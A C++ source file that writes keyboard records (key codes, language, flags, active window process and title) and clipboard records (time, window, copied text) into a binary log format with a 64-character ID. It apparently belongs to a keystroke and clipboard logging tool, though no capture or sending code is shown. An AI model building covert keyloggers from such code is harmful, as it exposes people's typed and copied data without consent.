#include "lrcdatawriter.hpp"
#include <iterator>
#include <locale>
#include <codecvt>

namespace lrcdata
{
	template<typename T>
	ByteVector getBytes(T data)
	{
		ByteVector bvResult;

		for (size_t i = sizeof(T); i > 0; --i)
		{
			bvResult.push_back(static_cast<byte>(data >> ((i - 1) * 8)));
		}

		return bvResult;
	}

	ByteVector getStrBytes(std::wstring text)
	{
		ByteVector bvResult;

		std::wstring_convert<std::codecvt_utf8<wchar_t>> textConvert;
		std::string strText = textConvert.to_bytes(text);

		ByteVector bvSize = getBytes(static_cast<uint32_t>(strText.size()));

		std::copy(bvSize.begin(), bvSize.end(), std::back_inserter(bvResult));
		std::copy(strText.begin(), strText.end(), std::back_inserter(bvResult));

		return bvResult;
	}

	// LRCDataWriter

	LRCDataWriter::LRCDataWriter(std::string id)
	{
		initHeader();
		if (id.length() != 64)
		{
			throw "ID length should be 64!";
		}
		strcpy_s(header.id, 65, id.c_str());
		header.type = 0x0;
	}

	ByteVector LRCDataWriter::GetBytes(std::list<PartKeyboard> data)
	{
		ByteVector dataBlock(getBytes(data.size()));

		for (std::list<PartKeyboard>::iterator it = data.begin(); it != data.end(); ++it)
		{
			ByteVector bvResult;

			// Subtype of part
			bvResult.push_back(it->subtype);

			if (it->subtype == 0x1)
			{
				ByteVector bvKeyCode = getBytes(it->vkInfo.keyCode);
				ByteVector bvLang = getBytes(it->vkInfo.lang);
				ByteVector bvFlags = getBytes(it->vkInfo.flags);

				std::copy(bvKeyCode.begin(), bvKeyCode.end(), std::back_inserter(bvResult));
				std::copy(bvLang.begin(), bvLang.end(), std::back_inserter(bvResult));
				std::copy(bvFlags.begin(), bvFlags.end(), std::back_inserter(bvResult));
			}
			else if (it->subtype == 0x2)
			{
				ByteVector bvProcessName = getStrBytes(it->wndInfo.processName);
				ByteVector bvTitle = getStrBytes(it->wndInfo.title);

				std::copy(bvProcessName.begin(), bvProcessName.end(), std::back_inserter(bvResult));
				std::copy(bvTitle.begin(), bvTitle.end(), std::back_inserter(bvResult));
			}

			std::copy(bvResult.begin(), bvResult.end(), std::back_inserter(dataBlock));
		}

		header.type = 0x01;
		header.length = dataBlock.size();

		ByteVector bvResult = getHeaderBytes();
		std::copy(dataBlock.begin(), dataBlock.end(), std::back_inserter(bvResult));
		return bvResult;
	}

	ByteVector LRCDataWriter::GetBytes(std::list<PartClipboard> data)
	{
		ByteVector dataBlock(getBytes(data.size()));

		for (std::list<PartClipboard>::iterator it = data.begin(); it != data.end(); ++it)
		{
			ByteVector bvResult;

			ByteVector bvTime = getBytes(it->time);
			ByteVector btProcessName = getStrBytes(it->wndInfo.processName);
			ByteVector bvTitle = getStrBytes(it->wndInfo.title);
			ByteVector bvData = getStrBytes(it->data);

			std::copy(bvTime.begin(), bvTime.end(), std::back_inserter(bvResult));
			std::copy(btProcessName.begin(), btProcessName.end(), std::back_inserter(bvResult));
			std::copy(bvTitle.begin(), bvTitle.end(), std::back_inserter(bvResult));
			std::copy(bvData.begin(), bvData.end(), std::back_inserter(bvResult));

			std::copy(bvResult.begin(), bvResult.end(), std::back_inserter(dataBlock));
		}

		header.type = 0x02;
		header.length = dataBlock.size();

		ByteVector bvResult = getHeaderBytes();
		std::copy(dataBlock.begin(), dataBlock.end(), std::back_inserter(bvResult));
		return bvResult;
	}

	bool LRCDataWriter::WriteData(std::string filename, std::list<PartKeyboard> data)
	{
		ByteVector bvData = GetBytes(data);

		binpp::BinaryWriter writer;
		writer.Append(bvData.data(), bvData.size());
		
		return writer.Save(filename);
	}

	bool LRCDataWriter::WriteData(std::string filename, std::list<PartClipboard> data)
	{
		ByteVector bvData = GetBytes(data);

		binpp::BinaryWriter writer;
		writer.Append(bvData.data(), bvData.size());

		return writer.Save(filename);
	}

	ByteVector LRCDataWriter::getHeaderBytes()
	{
		binpp::BinaryWriter writer;
		writer.Append(header.signature);
		writer.Append(header.version);
		writer.Append(header.id, 64);
		writer.Append(header.type);
		writer.Append(header.length);
		size_t headerLength = writer.Size();
		byte *rawBytes = new byte[headerLength];
		writer.GetBytes(rawBytes, headerLength);
		ByteVector result;
		std::copy(&rawBytes[0], &rawBytes[headerLength], std::back_inserter(result));
		return result;
	}

	void LRCDataWriter::initHeader()
	{
		this->header.signature = 0x539;
		this->header.version = 0x1;
	}

	// !LRCDataWriter
}